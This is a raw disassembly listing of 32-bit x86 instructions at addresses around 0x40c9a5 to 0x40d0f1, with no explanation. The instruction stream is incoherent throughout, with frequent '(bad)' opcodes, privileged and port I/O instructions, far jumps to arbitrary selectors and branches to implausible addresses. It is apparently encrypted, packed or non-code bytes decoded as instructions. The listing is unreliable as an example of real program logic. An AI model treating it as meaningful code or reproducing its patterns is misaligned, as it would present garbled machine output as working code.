  40c9a5:	cmp    eax,DWORD PTR [esi]
  40c9a7:	loope  0x40c999
  40c9a9:	push   ebx
  40c9aa:	inc    edx
  40c9ab:	inc    esi
  40c9ac:	(bad)  
  40c9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ae:	ret    0x462f
  40c9b1:	xlat   BYTE PTR ds:[ebx]
  40c9b2:	push   0x19
  40c9b4:	nop
  40c9b5:	or     eax,0x61addfab
  40c9ba:	pop    ebx
  40c9bb:	jp     0x40c9e9
  40c9bd:	shl    DWORD PTR [eax+eiz*1-0x5e],1
  40c9c1:	push   ds
  40c9c2:	fs daa 
  40c9c4:	int3   
  40c9c5:	sar    BYTE PTR [ecx+0x550877d2],0x8
  40c9cc:	loopne 0x40c95b
  40c9ce:	imul   edi,DWORD PTR [ecx],0x9622f8fa
  40c9d4:	jmp    0x40ca11
  40c9d6:	sahf   
  40c9d7:	mov    esp,0xe6529990
  40c9dc:	sbb    al,0x98
  40c9de:	jno    0xd109773c
  40c9e4:	pop    esi
  40c9e5:	adc    dl,al
  40c9e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e8:	clc    
  40c9e9:	mov    edx,0xe3d506bc
  40c9ee:	aam    0x22
  40c9f0:	cmp    eax,0x3f021fbe
  40c9f5:	or     al,0x8d
  40c9f7:	bound  ebp,QWORD PTR [edi-0x714962fc]
  40c9fd:	push   esp
  40c9fe:	ror    ebp,1
  40ca00:	mov    bh,0xa5
  40ca02:	and    BYTE PTR [eax+0x57],ch
  40ca05:	dec    ecx
  40ca06:	repnz stos DWORD PTR es:[edi],eax
  40ca08:	pop    ds
  40ca09:	(bad)  
  40ca0a:	ds hlt 
  40ca0c:	daa    
  40ca0d:	and    esp,DWORD PTR [esi]
  40ca0f:	cmc    
  40ca10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca11:	lahf   
  40ca12:	cwde   
  40ca13:	jbe    0x40ca5a
  40ca15:	les    esi,FWORD PTR [eax+0xf75784d]
  40ca1b:	lahf   
  40ca1c:	pop    es
  40ca1d:	fwait
  40ca1e:	js     0x40ca29
  40ca20:	cld    
  40ca21:	add    ecx,esi
  40ca23:	lds    eax,FWORD PTR [esi+0x4c3a31c1]
  40ca29:	pop    ss
  40ca2a:	jne    0x40ca1e
  40ca2c:	sbb    al,bl
  40ca2e:	in     al,dx
  40ca2f:	ror    BYTE PTR [edi],0xba
  40ca32:	cdq    
  40ca33:	or     ah,cl
  40ca35:	mov    al,ds:0x90665f89
  40ca3a:	mov    al,0x6b
  40ca3c:	loope  0x40ca61
  40ca3e:	dec    eax
  40ca3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca40:	mov    cl,0x31
  40ca42:	aam    0x3b
  40ca44:	es lahf 
  40ca46:	nop
  40ca47:	jmp    0xa33dbbee
  40ca4c:	adc    ecx,esp
  40ca4e:	call   DWORD PTR [esi+0x4315fac7]
  40ca54:	daa    
  40ca55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca56:	mov    ebp,0x841a3073
  40ca5b:	adc    BYTE PTR [eax],ch
  40ca5d:	repnz xchg ebp,eax
  40ca5f:	popf   
  40ca60:	pop    esi
  40ca61:	jp     0x40ca1a
  40ca63:	daa    
  40ca64:	(bad)  
  40ca65:	and    eax,0x8cafc7ef
  40ca6a:	dec    edx
  40ca6b:	fmulp  st(5),st
  40ca6d:	or     dl,BYTE PTR [ecx+0x4a3694e0]
  40ca73:	into   
  40ca74:	push   ecx
  40ca75:	into   
  40ca76:	jmp    0x2266:0xebb377e0
  40ca7d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca7f:	add    BYTE PTR [ebx+0x38],ah
  40ca82:	lahf   
  40ca83:	and    BYTE PTR [ecx+eax*4-0x62],bh
  40ca87:	pop    eax
  40ca88:	cli    
  40ca89:	lahf   
  40ca8a:	fild   QWORD PTR cs:[eax-0x19cce2f9]
  40ca91:	cmp    dl,BYTE PTR [esi]
  40ca93:	lods   eax,DWORD PTR ds:[esi]
  40ca94:	aaa    
  40ca95:	out    0xdf,al
  40ca97:	adc    al,0x59
  40ca99:	pop    ebx
  40ca9a:	jbe    0x40ca21
  40ca9c:	or     ebx,DWORD PTR fs:[edx+0x129e8612]
  40caa3:	sub    al,0x1d
  40caa5:	or     DWORD PTR ds:0xf834d0f1,ebp
  40caab:	call   0xb94b14ee
  40cab0:	popf   
  40cab1:	loopne 0x40ca52
  40cab3:	repnz pop eax
  40cab5:	aaa    
  40cab6:	pop    ss
  40cab7:	push   eax
  40cab8:	mul    DWORD PTR [esi+0x565c935a]
  40cabe:	dec    edx
  40cabf:	sbb    BYTE PTR [esi+0x16a049ec],cl
  40cac5:	test   al,0x40
  40cac7:	sahf   
  40cac8:	push   edi
  40cac9:	xlat   BYTE PTR ds:[ebx]
  40caca:	loope  0x40ca82
  40cacc:	test   eax,0xd182bc59
  40cad1:	dec    ecx
  40cad2:	clc    
  40cad3:	sub    esi,DWORD PTR [edi+0x2286a8fd]
  40cad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cada:	arpl   di,dx
  40cadc:	xchg   edx,eax
  40cadd:	jae    0x40cb43
  40cadf:	pusha  
  40cae0:	call   0xd608f51d
  40cae5:	dec    eax
  40cae6:	push   esp
  40cae7:	mov    ebx,0xe53ce68d
  40caec:	mov    esp,0x41041dcb
  40caf1:	call   DWORD PTR [edx]
  40caf3:	or     dh,BYTE PTR [eax-0x2b]
  40caf6:	xor    al,0xf1
  40caf8:	repz cs push ecx
  40cafb:	mov    al,ds:0x40a1da0e
  40cb00:	inc    esp
  40cb02:	xor    DWORD PTR ds:0xe358ca1,0xe6f1988a
  40cb0c:	xchg   esi,eax
  40cb0d:	pop    es
  40cb0e:	retf   
  40cb0f:	aad    0x28
  40cb11:	push   es
  40cb12:	std    
  40cb13:	push   ebx
  40cb14:	jge    0x40cb0a
  40cb16:	xlat   BYTE PTR ds:[ebx]
  40cb17:	sbb    DWORD PTR [eax-0x7e],ebx
  40cb1a:	or     DWORD PTR [edx+eiz*2+0x19],esi
  40cb1e:	iret   
  40cb1f:	xor    DWORD PTR [ebp-0x6b23c8b9],esp
  40cb25:	pop    ecx
  40cb26:	jbe    0x40cb90
  40cb28:	rcl    DWORD PTR [ecx],0x43
  40cb2b:	pop    edi
  40cb2c:	add    DWORD PTR [esi],esi
  40cb2e:	pop    es
  40cb2f:	scas   al,BYTE PTR es:[edi]
  40cb30:	sbb    eax,0xfb840fb7
  40cb35:	inc    edx
  40cb36:	pop    ebx
  40cb37:	mov    ds:0xb0f123bc,eax
  40cb3c:	arpl   WORD PTR [edi],si
  40cb3e:	jle    0x40caf7
  40cb40:	scas   al,BYTE PTR es:[edi]
  40cb41:	sub    DWORD PTR [esp+edi*8+0x9e3dfd6],ebp
  40cb48:	pop    esi
  40cb49:	adc    DWORD PTR [ebx-0x4109c002],0xb5ff12a7
  40cb53:	lods   eax,DWORD PTR ss:[esi]
  40cb55:	push   edi
  40cb56:	repz aas 
  40cb58:	pushf  
  40cb59:	repz mov al,0x38
  40cb5c:	(bad)  
  40cb5d:	xor    ch,BYTE PTR [ebx+0x7d]
  40cb60:	inc    ebp
  40cb61:	mov    BYTE PTR [ebp+0x40039995],dh
  40cb67:	inc    esi
  40cb68:	inc    ecx
  40cb69:	and    esp,edx
  40cb6b:	and    dl,BYTE PTR [ebp-0xa]
  40cb6e:	test   eax,0xb2fe09de
  40cb73:	(bad)  
  40cb74:	call   0x95b1:0x854624b7
  40cb7b:	jecxz  0x40cb3b
  40cb7d:	adc    eax,0x3d4b2e8a
  40cb82:	push   0x53
  40cb84:	push   es
  40cb85:	add    ecx,DWORD PTR [ebx-0x48]
  40cb88:	push   cs
  40cb89:	jle    0x40cb24
  40cb8b:	hlt    
  40cb8c:	ret    0x33a2
  40cb8f:	xchg   edi,eax
  40cb90:	sbb    ch,bh
  40cb92:	jns    0x40cb6e
  40cb94:	retf   
  40cb95:	sbb    esi,DWORD PTR [ecx-0xaf75591]
  40cb9b:	iret   
  40cb9c:	and    ah,BYTE PTR [edx+0x5b]
  40cb9f:	inc    eax
  40cba0:	mov    ecx,0x2ca34a7b
  40cba5:	jb     0x40cb66
  40cba7:	shl    DWORD PTR [eax],cl
  40cba9:	xchg   edx,eax
  40cbaa:	lahf   
  40cbab:	enter  0x41ff,0x93
  40cbaf:	jp     0x40cc12
  40cbb1:	fisub  WORD PTR [ecx+ebx*4+0x27f6399c]
  40cbb8:	ds pushf 
  40cbba:	stos   BYTE PTR es:[edi],al
  40cbbb:	cmp    eax,0xb08f8001
  40cbc0:	and    DWORD PTR [edx+eax*2-0x3c],esp
  40cbc4:	jnp    0x40cb6a
  40cbc6:	repz cmc 
  40cbc8:	or     al,0xfe
  40cbca:	aas    
  40cbcb:	in     eax,dx
  40cbcc:	xlat   BYTE PTR ds:[ebx]
  40cbcd:	icebp  
  40cbce:	mov    BYTE PTR [esi-0x7606d0fc],ah
  40cbd4:	inc    eax
  40cbd5:	rcr    BYTE PTR [eax-0xf],1
  40cbd8:	enter  0x75de,0x3f
  40cbdc:	nop
  40cbdd:	xchg   ebx,eax
  40cbde:	push   ebp
  40cbdf:	(bad)  
  40cbe0:	fs ret 0xb215
  40cbe4:	rcr    DWORD PTR [edx-0x2c341484],cl
  40cbea:	sbb    esp,DWORD PTR [ebp+0x4f]
  40cbed:	push   ecx
  40cbee:	cwde   
  40cbef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbf2:	mov    dl,0xc3
  40cbf4:	outs   dx,BYTE PTR ds:[esi]
  40cbf5:	(bad)  
  40cbf6:	push   ebp
  40cbf7:	xor    bl,BYTE PTR [edi+0x27]
  40cbfa:	pop    edi
  40cbfb:	sub    al,0x2d
  40cbfd:	mov    edx,fs
  40cbff:	hlt    
  40cc00:	iret   
  40cc01:	sub    BYTE PTR [ebp-0x3b],0x2e
  40cc05:	xor    cl,ah
  40cc07:	add    eax,0x58679794
  40cc0c:	das    
  40cc0d:	sub    dh,al
  40cc0f:	icebp  
  40cc10:	xor    al,0x2
  40cc12:	jae    0x40cc77
  40cc14:	in     eax,0xe4
  40cc16:	push   esi
  40cc17:	mov    dh,0x2
  40cc19:	inc    esi
  40cc1a:	fwait
  40cc1b:	(bad)
  40cc1f:	pop    ecx
  40cc20:	leave  
  40cc21:	xchg   edx,eax
  40cc22:	lock or BYTE PTR [esi-0x56],ah
  40cc26:	push   edi
  40cc27:	cwde   
  40cc28:	scas   al,BYTE PTR es:[edi]
  40cc29:	test   edi,esp
  40cc2b:	push   ss
  40cc2c:	mov    bl,0x36
  40cc2e:	xchg   dh,bh
  40cc30:	movhps QWORD PTR [edi+0x7a18d14f],xmm5
  40cc37:	pusha  
  40cc38:	lock mov BYTE PTR [ecx-0x45aa04c],0x48
  40cc40:	fcom   QWORD PTR [ecx+0x60549f08]
  40cc46:	mov    eax,0x63d433c1
  40cc4b:	push   esi
  40cc4c:	fcom   DWORD PTR [edi-0x5e]
  40cc4f:	and    eax,0x92cefec3
  40cc54:	mov    ah,0x55
  40cc56:	and    BYTE PTR [edx+0x22ec3d3c],ah
  40cc5c:	xor    BYTE PTR [ecx+0x76],bl
  40cc5f:	pop    eax
  40cc60:	les    esi,FWORD PTR [esi+0x551bd3d8]
  40cc66:	or     DWORD PTR [edi],esp
  40cc68:	addr16 retf 0x263
  40cc6c:	jge    0x40cc83
  40cc6e:	dec    ebx
  40cc6f:	push   es
  40cc70:	mov    ch,0xa1
  40cc72:	ret    0x9128
  40cc75:	inc    esi
  40cc76:	mov    esi,0x3990f6
  40cc7b:	mov    edx,0x938ada10
  40cc80:	pop    esp
  40cc81:	mov    eax,0x78be32f5
  40cc86:	sub    cl,BYTE PTR [ecx+0x1e]
  40cc89:	pop    ecx
  40cc8a:	cmp    al,0xf1
  40cc8c:	mov    ah,0xa6
  40cc8e:	push   ebx
  40cc8f:	lea    eax,[edx+0x2]
  40cc92:	sbb    esp,DWORD PTR [eax]
  40cc94:	aam    0xd3
  40cc96:	rcr    DWORD PTR [eax+0x4e],1
  40cc99:	icebp  
  40cc9a:	xor    ecx,0xc5828977
  40cca0:	xchg   BYTE PTR [esi-0x72],bh
  40cca3:	repnz cmp eax,0xec8fb8d1
  40cca9:	push   esp
  40ccaa:	sbb    eax,0x503341a9
  40ccaf:	add    cl,BYTE PTR [edx]
  40ccb1:	xchg   esp,eax
  40ccb2:	jae    0x40cc81
  40ccb4:	retf   0xb6aa
  40ccb7:	ss jl  0x40cc79
  40ccba:	call   0x5d35:0xae94bf9b
  40ccc1:	mov    esi,0x409d5ebc
  40ccc6:	shl    DWORD PTR [ecx+0x673d31ca],cl
  40cccc:	in     eax,0x11
  40ccce:	mov    al,ds:0xab10c5d4
  40ccd3:	jl     0x40cc6b
  40ccd5:	mov    ebx,edi
  40ccd7:	fs sub ah,dh
  40ccda:	stc    
  40ccdb:	icebp  
  40ccdc:	loope  0x40ccbe
  40ccde:	xor    eax,0xe531ef60
  40cce3:	je     0x40ccd2
  40cce5:	aaa    
  40cce6:	jae    0x40ccfa
  40cce8:	mov    al,0xf8
  40ccea:	pop    ds
  40cceb:	xor    DWORD PTR [eax+0x5a],0x75f7a391
  40ccf2:	inc    ecx
  40ccf3:	mov    ch,0x32
  40ccf5:	jmp    0x6a49b853
  40ccfa:	pop    ds
  40ccfb:	repz or bh,ah
  40ccfe:	lods   al,BYTE PTR ds:[esi]
  40ccff:	rol    edi,0xca
  40cd02:	mov    edi,ds
  40cd04:	pop    edi
  40cd05:	dec    ecx
  40cd06:	daa    
  40cd07:	(bad)  
  40cd08:	push   edx
  40cd09:	lahf   
  40cd0a:	xor    BYTE PTR ss:[edi+eiz*1],0x12
  40cd0f:	sti    
  40cd10:	jmp    0x40cd27
  40cd12:	into   
  40cd13:	jl     0x40cd05
  40cd15:	or     eax,0xc1deebc5
  40cd1a:	mov    ds:0xfcdb8207,al
  40cd1f:	icebp  
  40cd20:	xlat   BYTE PTR ds:[ebx]
  40cd21:	jb     0x40cd32
  40cd23:	jle    0x40cd31
  40cd25:	test   eax,0x77d9ba9c
  40cd2a:	pushf  
  40cd2b:	pop    edx
  40cd2c:	(bad)  
  40cd2d:	das    
  40cd2e:	mov    ebp,0xd99da467
  40cd33:	adc    DWORD PTR [eax+0x538ff8ad],ecx
  40cd39:	mov    al,0x2a
  40cd3b:	pusha  
  40cd3c:	pop    ds
  40cd3d:	adc    cl,BYTE PTR [edi+eiz*2-0x80]
  40cd41:	ds pop edi
  40cd43:	sub    al,0xa6
  40cd45:	dec    ecx
  40cd46:	jp     0x40ccda
  40cd48:	popa   
  40cd49:	lahf   
  40cd4a:	sbb    ah,dl
  40cd4c:	aad    0x3f
  40cd4e:	enter  0xcc25,0xf
  40cd52:	push   ss
  40cd53:	in     eax,0xe7
  40cd55:	jmp    0x40cdaf
  40cd57:	aam    0x2c
  40cd59:	xor    al,0xe5
  40cd5b:	pushf  
  40cd5c:	out    0xae,al
  40cd5e:	jge    0x40cd8d
  40cd60:	sahf   
  40cd61:	int3   
  40cd62:	mov    al,ds:0x90b49a0e
  40cd67:	sbb    bh,dh
  40cd69:	js     0x40cd0b
  40cd6b:	stc    
  40cd6c:	push   eax
  40cd6d:	mov    dh,0xc9
  40cd6f:	lods   al,BYTE PTR ds:[esi]
  40cd70:	pop    edi
  40cd71:	std    
  40cd72:	iret   
  40cd73:	add    BYTE PTR [eax-0x3f],0xcb
  40cd77:	retf   0x534d
  40cd7a:	add    al,0xfc
  40cd7c:	add    BYTE PTR [ebx+0x485affc9],0x18
  40cd83:	retf   0x77d7
  40cd86:	jo     0x40cd2d
  40cd88:	stc    
  40cd89:	clc    
  40cd8a:	jno    0x40cde5
  40cd8c:	sub    esi,DWORD PTR [edx+0x67]
  40cd8f:	mov    ch,0xc5
  40cd91:	cmp    BYTE PTR [ecx-0x5c140e7c],dh
  40cd97:	mov    ds,WORD PTR [ebx+0xad0643e]
  40cd9d:	mov    al,0x4f
  40cd9f:	mov    WORD PTR [edx+0x3],es
  40cda2:	sub    ecx,DWORD PTR [ebp+0x4ab4258e]
  40cda8:	push   ebx
  40cda9:	add    BYTE PTR [edx-0x1b0f03e5],bh
  40cdaf:	dec    ebp
  40cdb0:	mov    dl,0x36
  40cdb2:	jns    0x40cda8
  40cdb4:	mov    ebx,0xdaa98089
  40cdb9:	ret    0x713a
  40cdbc:	adc    cl,BYTE PTR [ecx+0x1af43e9f]
  40cdc2:	sub    BYTE PTR [edx],ch
  40cdc4:	iret   
  40cdc5:	aad    0x6a
  40cdc7:	fisub  DWORD PTR [ebp-0x7c]
  40cdca:	xor    BYTE PTR [ebp-0x5f],bl
  40cdcd:	scas   al,BYTE PTR es:[edi]
  40cdce:	and    DWORD PTR [ebp-0x2c371ad8],0xc3c794e7
  40cdd8:	repnz (bad) 
  40cdda:	mov    ds:0xf01ab75a,al
  40cddf:	adc    esp,edx
  40cde1:	je     0x40cda6
  40cde3:	fucomp st(4)
  40cde5:	ret    
  40cde6:	in     al,dx
  40cde7:	mov    ebp,cs
  40cde9:	and    bl,BYTE PTR [ecx+ebp*2-0x21dcd4a7]
  40cdf0:	inc    edi
  40cdf1:	cmp    esp,0x7c857d0
  40cdf7:	ss jne 0x40cd80
  40cdfa:	stos   DWORD PTR es:[edi],eax
  40cdfb:	add    edi,DWORD PTR [edi-0x5e]
  40cdfe:	in     al,dx
  40cdff:	cmp    dh,bl
  40ce01:	ficom  DWORD PTR [eax+0x5a]
  40ce04:	xchg   esp,eax
  40ce05:	shl    BYTE PTR [edx],cl
  40ce07:	mov    dl,0x55
  40ce09:	imul   ebp,edx,0xffffffdb
  40ce0c:	clc    
  40ce0d:	mov    ds,WORD PTR [esi]
  40ce0f:	jge    0x40cde5
  40ce11:	dec    esp
  40ce12:	xor    ch,BYTE PTR [edi+0x4d64f05b]
  40ce18:	or     eax,0xca003a5c
  40ce1d:	out    0x7b,al
  40ce1f:	loop   0x40cddf
  40ce21:	loope  0x40ce9d
  40ce23:	mov    DWORD PTR [ebx+0x34b4f7fe],esp
  40ce29:	mov    bl,dl
  40ce2b:	out    0xdc,eax
  40ce2d:	sub    eax,0x61c20b52
  40ce32:	xor    ebp,ebp
  40ce34:	mul    BYTE PTR [ebx]
  40ce36:	shr    DWORD PTR ds:0x802b77b0,cl
  40ce3c:	push   0x59
  40ce3e:	jae    0x40ce7b
  40ce40:	sbb    ebp,DWORD PTR [edi]
  40ce42:	fwait
  40ce43:	jb     0x40ce54
  40ce45:	out    dx,al
  40ce46:	push   es
  40ce47:	imul   edx,edi,0xffffffd7
  40ce4a:	and    DWORD PTR [esi],ecx
  40ce4c:	scas   eax,DWORD PTR es:[edi]
  40ce4d:	imul   edx,esp,0xe1ea2847
  40ce53:	and    dl,BYTE PTR [eax+0x3f]
  40ce56:	mov    ds,edx
  40ce58:	test   bl,ah
  40ce5a:	push   ss
  40ce5b:	sti    
  40ce5c:	push   edx
  40ce5d:	adc    ch,BYTE PTR [ebx]
  40ce5f:	loop   0x40ce95
  40ce61:	shl    DWORD PTR [ebx],0xbd
  40ce64:	fwait
  40ce65:	(bad)  
  40ce66:	int    0x19
  40ce68:	arpl   WORD PTR [ecx-0x21],ax
  40ce6b:	aas    
  40ce6c:	aaa    
  40ce6d:	call   0xe960:0x332b2d2a
  40ce74:	jmp    0x40ce09
  40ce76:	shl    DWORD PTR [ebx-0x27],1
  40ce79:	xchg   esi,eax
  40ce7a:	adc    BYTE PTR [ebx+0x59657484],dl
  40ce80:	cmp    DWORD PTR [ecx+0x76fdb36a],edi
  40ce86:	cli    
  40ce87:	test   DWORD PTR [ebp-0x30],ebp
  40ce8a:	sub    eax,0x3f14caaa
  40ce8f:	sub    esi,ecx
  40ce91:	mov    edx,0xa06d462d
  40ce96:	imul   DWORD PTR [ebx+eiz*2+0x5b]
  40ce9a:	add    al,0xfd
  40ce9c:	and    BYTE PTR [edi],dl
  40ce9e:	sbb    al,0xe7
  40cea0:	scas   al,BYTE PTR es:[edi]
  40cea1:	retf   0x7acd
  40cea4:	mov    al,ds:0x3dbd600d
  40cea9:	push   edi
  40ceaa:	cli    
  40ceab:	mov    ds:0x704aef83,al
  40ceb0:	(bad)  
  40ceb1:	dec    ebx
  40ceb2:	pop    ecx
  40ceb3:	adc    BYTE PTR [ebx],ah
  40ceb5:	stos   DWORD PTR es:[edi],eax
  40ceb6:	or     al,0x7
  40ceb8:	sti    
  40ceb9:	aas    
  40ceba:	xor    eax,0x8b066a66
  40cebf:	jl     0x40cf28
  40cec1:	mov    eax,0xb5ea346e
  40cec6:	dec    ebp
  40cec7:	mov    edi,0x54f83ad2
  40cecc:	xor    eax,0xeaf100df
  40ced1:	cld    
  40ced2:	shl    BYTE PTR [esi+ebp*8+0x23aa1820],cl
  40ced9:	cmp    ch,ch
  40cedb:	pop    esp
  40cedc:	and    bl,dh
  40cede:	aas    
  40cedf:	xor    BYTE PTR [eax+ebx*8+0x7d],al
  40cee3:	mov    DWORD PTR [esi],ebx
  40cee5:	mov    edx,0x44661c80
  40ceea:	mov    ah,0x5d
  40ceec:	js     0x40cf29
  40ceee:	test   edx,esi
  40cef0:	sub    bl,BYTE PTR [ebx-0x66]
  40cef3:	add    DWORD PTR [edi],ebx
  40cef5:	jnp    0x40ce99
  40cef7:	ins    DWORD PTR es:[edi],dx
  40cef8:	sub    cl,BYTE PTR [eax+0x48]
  40cefb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cefc:	push   ds
  40cefd:	mov    al,ds:0x1b362780
  40cf02:	mov    ch,0x82
  40cf04:	dec    ebx
  40cf05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf06:	or     al,0xd3
  40cf08:	pop    esi
  40cf09:	aas    
  40cf0a:	je     0x40cea7
  40cf0c:	and    ecx,DWORD PTR [edx-0x15a13368]
  40cf12:	inc    edi
  40cf13:	cmc    
  40cf14:	ficom  WORD PTR [ebx-0x27b2770d]
  40cf1a:	xor    al,0x42
  40cf1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf1d:	push   ds
  40cf1e:	push   ss
  40cf1f:	mov    ebp,0x3d39f653
  40cf24:	out    0xb1,al
  40cf26:	adc    esi,DWORD PTR [edx+0x76]
  40cf29:	popf   
  40cf2a:	xor    BYTE PTR [ebp+0x5965f685],bh
  40cf30:	popa   
  40cf31:	icebp  
  40cf32:	jmp    0x5523:0xd6aaf675
  40cf39:	int3   
  40cf3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf3b:	xor    ah,dh
  40cf3d:	push   cs
  40cf3e:	into   
  40cf3f:	mov    eax,ds:0xbb0e310c
  40cf44:	and    BYTE PTR [ebp+0x20],bl
  40cf47:	jle    0x40cefb
  40cf49:	add    BYTE PTR ds:0xf29bd957,dl
  40cf4f:	fild   QWORD PTR [edi-0x3d]
  40cf52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf53:	aam    0x9d
  40cf55:	test   BYTE PTR [ecx],0x50
  40cf58:	dec    ebp
  40cf59:	inc    esp
  40cf5a:	adc    edi,DWORD PTR [edx-0xf70a10f]
  40cf60:	cwde   
  40cf61:	fistp  DWORD PTR [eax-0x37a6581e]
  40cf67:	add    bh,BYTE PTR [edi+0x21]
  40cf6a:	pusha  
  40cf6b:	fidiv  WORD PTR [ecx-0x53]
  40cf6e:	inc    edi
  40cf6f:	xor    BYTE PTR [edi],dl
  40cf71:	pop    ebx
  40cf72:	adc    BYTE PTR [edx],ah
  40cf74:	mov    WORD PTR [ecx-0x7e],fs
  40cf77:	inc    esp
  40cf78:	fadd   QWORD PTR ds:0x15ad0de7
  40cf7e:	adc    al,0xd1
  40cf80:	or     al,0x71
  40cf82:	imul   BYTE PTR ds:0xb0584055
  40cf88:	ins    BYTE PTR es:[edi],dx
  40cf89:	jno    0x40cfc0
  40cf8b:	pop    ecx
  40cf8c:	inc    ebp
  40cf8d:	add    eax,0x84c9f6b4
  40cf92:	push   0xffffff8e
  40cf94:	outs   dx,BYTE PTR ds:[esi]
  40cf95:	inc    edx
  40cf96:	loopne 0x40cfb5
  40cf98:	(bad)  
  40cf99:	loop   0x40d016
  40cf9b:	xor    DWORD PTR [eax-0x179432bd],esp
  40cfa1:	push   es
  40cfa2:	ret    
  40cfa3:	lods   eax,DWORD PTR ds:[esi]
  40cfa4:	or     ecx,DWORD PTR [esi]
  40cfa6:	and    eax,0x4e396087
  40cfab:	xchg   esp,eax
  40cfac:	jae    0x40cf74
  40cfae:	pop    DWORD PTR [ebx]
  40cfb0:	jle    0x40d018
  40cfb2:	adc    dh,BYTE PTR [edi-0x68]
  40cfb5:	push   cs
  40cfb6:	mov    edi,0x2c643d53
  40cfbb:	out    dx,al
  40cfbc:	gs das 
  40cfbe:	xchg   ebp,eax
  40cfbf:	pushf  
  40cfc0:	loopne 0x40d02b
  40cfc2:	push   ecx
  40cfc3:	and    DWORD PTR es:[ebx+0x52],ecx
  40cfc7:	xchg   ebx,eax
  40cfc8:	in     al,dx
  40cfc9:	test   BYTE PTR [edi],0xdf
  40cfcc:	enter  0xe296,0x10
  40cfd0:	mov    al,ds:0xf586a0f1
  40cfd5:	sub    al,0xa0
  40cfd7:	adc    BYTE PTR [eax+0xb],al
  40cfda:	ffree  st(0)
  40cfdc:	ins    BYTE PTR es:[edi],dx
  40cfdd:	fsubr  DWORD PTR [esi+eiz*4]
  40cfe0:	mov    BYTE PTR [ebx-0x2f],ch
  40cfe3:	lods   al,BYTE PTR ds:[esi]
  40cfe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfe5:	pop    ss
  40cfe6:	mov    edi,0x1e027cd8
  40cfeb:	mov    ebp,0xa0132a23
  40cff0:	data16 (bad) 
  40cff3:	mov    ds:0xebb10aea,eax
  40cff8:	or     edx,DWORD PTR [esi-0x22]
  40cffb:	xor    esi,ebp
  40cffd:	into   
  40cffe:	sub    BYTE PTR [esi-0x3148f20c],dl
  40d004:	out    0x5a,al
  40d006:	dec    ecx
  40d007:	or     eax,ebp
  40d009:	mov    DWORD PTR ds:0x4dc4bf40,esi
  40d00f:	xchg   edx,eax
  40d010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d011:	clc    
  40d012:	xor    al,0xd6
  40d014:	mov    bl,0xf7
  40d016:	out    dx,al
  40d017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d018:	sub    BYTE PTR [eax-0x76e8259e],0x9b
  40d01f:	pop    edx
  40d020:	xchg   esp,esi
  40d022:	jns    0x40d065
  40d024:	inc    ebp
  40d025:	xor    ecx,DWORD PTR [eax+0x37]
  40d028:	mov    al,ds:0xe36b3868
  40d02d:	adc    DWORD PTR [ebx-0x22bf09ca],eax
  40d033:	test   BYTE PTR ss:[edi+0x4b],dh
  40d037:	jmp    0x83546cab
  40d03c:	clc    
  40d03d:	sub    DWORD PTR ds:0x40040894,0x2b
  40d044:	loopne 0x40d094
  40d046:	jge    0x40d05b
  40d048:	mov    ch,0xeb
  40d04a:	xchg   ecx,eax
  40d04b:	sub    cl,dh
  40d04d:	dec    esi
  40d04e:	enter  0x4075,0x5f
  40d052:	mov    eax,0x9cb560cc
  40d057:	or     eax,0x256252d2
  40d05c:	push   ebx
  40d05d:	xchg   BYTE PTR [eax+0x2a],ah
  40d060:	jb     0x40d0c0
  40d062:	add    DWORD PTR [edx],esp
  40d064:	mov    ah,BYTE PTR [esi+0x38826aae]
  40d06a:	sbb    ah,cl
  40d06c:	xor    BYTE PTR [edi+0x34],bh
  40d06f:	call   0x655a5d23
  40d074:	adc    al,0xba
  40d076:	jb     0x40d034
  40d078:	ins    DWORD PTR es:[edi],dx
  40d079:	dec    ecx
  40d07b:	test   al,0x90
  40d07d:	adc    BYTE PTR [ecx+0xe],ch
  40d080:	xor    eax,0x9c8abba0
  40d085:	cli    
  40d086:	cmp    DWORD PTR [ecx],0x27
  40d089:	pop    edi
  40d08a:	cmp    ebp,DWORD PTR [edi+0x43fffbbd]
  40d090:	xor    DWORD PTR [ecx-0x2a],edx
  40d093:	lods   eax,DWORD PTR ds:[esi]
  40d094:	cs dec ecx
  40d096:	into   
  40d097:	jno    0x40d102
  40d099:	pop    eax
  40d09a:	gs mov edx,0x8c7d75ed
  40d0a0:	or     eax,0xc733f2c2
  40d0a5:	inc    edx
  40d0a6:	jae    0x40d049
  40d0a8:	jmp    0x6a40:0xa60aea3
  40d0af:	mov    DWORD PTR [ebx-0xfcc1d19],esp
  40d0b5:	jl     0x40d09d
  40d0b7:	mov    edx,0xa37f1c3c
  40d0bc:	and    al,0xaa
  40d0be:	cmp    DWORD PTR [edi-0x3c],ebp
  40d0c1:	int    0xb1
  40d0c3:	call   0x438:0x8a843ba4
  40d0ca:	or     DWORD PTR [ecx+0x422e3ae1],edx
  40d0d0:	test   eax,0x647872e2
  40d0d5:	mov    esi,0xcef31222
  40d0da:	js     0x40d14e
  40d0dc:	sub    BYTE PTR [ecx-0x615cc2b4],ch
  40d0e2:	mov    dl,0x93
  40d0e4:	jae    0x40d0cf
  40d0e6:	sub    eax,0xdfa1c93e
  40d0eb:	idiv   BYTE PTR [eax]
  40d0ed:	in     eax,0x76
  40d0ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0f0:	ins    BYTE PTR es:[edi],dx
  40d0f1:	gs out dx,eax
